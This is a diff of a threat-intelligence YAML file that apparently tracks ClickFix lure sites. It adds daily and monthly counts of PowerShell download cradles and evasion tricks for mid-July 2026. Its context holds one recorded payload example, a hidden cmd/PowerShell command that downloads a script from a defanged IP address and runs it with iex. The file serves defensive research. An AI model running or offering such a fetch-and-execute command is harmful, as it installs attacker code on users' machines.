@@ -4,17 +4,17 @@
 
 meta:
   source: https://mhaggis.github.io/ClickGrab/
-  date_range: 2025-04-17 to 2026-07-13
-  total_reports: 548
-  total_sites_crawled: 26969
-  total_malicious: 22772
+  date_range: 2025-04-17 to 2026-07-16
+  total_reports: 551
+  total_sites_crawled: 27269
+  total_malicious: 22890
   total_domains: 3777
-  generated: '2026-07-13'
-  appended_through: '2026-07-13'
-  carson_landscape: 3736
-  carson_updated: '2026-07-09T04:00:44Z'
-  carson_lure_overlap: 64
-  carson_lure_observed: 96
+  generated: '2026-07-17'
+  appended_through: '2026-07-16'
+  carson_landscape: 3774
+  carson_updated: '2026-07-16T21:00:53Z'
+  carson_lure_overlap: 58
+  carson_lure_observed: 89
   domain_source: clickfix-domains-all-2026-07-17.xlsx
   domain_updated: '2026-07-17'
 daily:
@@ -5038,6 +5038,63 @@ daily:
     self_delete: 3
     start_sleep: 3
     hidden_window: 5
+- date: '2026-07-14'
+  total_sites: 100
+  malicious: 41
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 3
+    curl: 0
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 0
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 3
+    start_sleep: 3
+    hidden_window: 5
+- date: '2026-07-15'
+  total_sites: 100
+  malicious: 41
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 2
+    curl: 1
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 1
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 2
+    start_sleep: 2
+    hidden_window: 4
+- date: '2026-07-16'
+  total_sites: 100
+  malicious: 36
+  cradles:
+    iwr_iex: 3
+    irm_iex: 0
+    webclient: 1
+    curl: 1
+    msiexec: 0
+    vbs_wscript: 1
+    hex_xor: 0
+    inline_no_url: 2
+  evasion:
+    mixed_case: 0
+    base64: 1
+    cdn_staging: 1
+    self_delete: 1
+    start_sleep: 1
+    hidden_window: 3
 payload_examples:
   iwr_iex:
   - date: '2025-08-14'
@@ -5080,22 +5137,22 @@ payload_examples:
   - date: '2025-10-31'
     text: cmd.exe /c start /min powershell -w hidden -nop -c "(New-Object Net.WebClient).DownloadString('hxxps://95[.]164[.]53[.]214/b.ps1') | iex"
 cradles_total:
-  iwr_iex: 2269
+  iwr_iex: 2278
   irm_iex: 89
-  webclient: 1034
-  curl: 1437
+  webclient: 1040
+  curl: 1439
   msiexec: 1027
-  vbs_wscript: 387
+  vbs_wscript: 390
   hex_xor: 70
-  inline_no_url: 705
+  inline_no_url: 708
 evasion_totals:
   mixed_case: 1697
-  base64: 10477
-  cdn_staging: 464
-  self_delete: 1017
-  start_sleep: 1017
-  hidden_window: 3509
-  inline_payload: 705
+  base64: 10480
+  cdn_staging: 467
+  self_delete: 1023
+  start_sleep: 1023
+  hidden_window: 3521
+  inline_payload: 708
 domain_monthly:
 - month: 2025-08
   n: 135
@@ -5709,24 +5766,24 @@ monthly:
     start_sleep: 83
     hidden_window: 139
 - month: 2026-07
-  total_sites: 1262
-  malicious: 522
+  total_sites: 1562
+  malicious: 640
   cradles:
-    iwr_iex: 39
+    iwr_iex: 48
     irm_iex: 0
-    webclient: 22
-    curl: 18
+    webclient: 28
+    curl: 20
     msiexec: 0
-    vbs_wscript: 13
+    vbs_wscript: 16
     hex_xor: 0
-    inline_no_url: 13
+    inline_no_url: 16
   evasion:
     mixed_case: 0
-    base64: 13
-    cdn_staging: 13
-    self_delete: 22
-    start_sleep: 22
-    hidden_window: 48
+    base64: 16
+    cdn_staging: 16
+    self_delete: 28
+    start_sleep: 28
+    hidden_window: 60
 domain_cradles_total:
   iwr: 343
   irm: 196
